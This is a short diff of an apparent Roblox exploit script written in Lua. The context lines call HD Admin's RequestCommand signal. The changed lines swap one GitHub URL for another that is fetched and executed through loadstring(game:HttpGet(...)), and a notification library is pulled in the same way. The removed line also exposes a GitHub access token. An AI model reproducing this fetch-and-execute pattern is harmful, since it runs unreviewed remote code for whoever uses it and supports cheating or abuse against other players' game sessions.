@@ -358,7 +358,7 @@ game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:Invoke
     wait(1)
     
 
-loadstring(game:HttpGet('https://raw.githubusercontent.com/qqc4/source/main/sex%20doll?token=GHSAT0AAAAAAB3WKYEQXUQQBV6LSAL5E474Y525XBQ'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/0noo/-/main/xll'))()
 
 local AkaliNotif = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/Dynissimo/main/Scripts/AkaliNotif.lua"))();
 
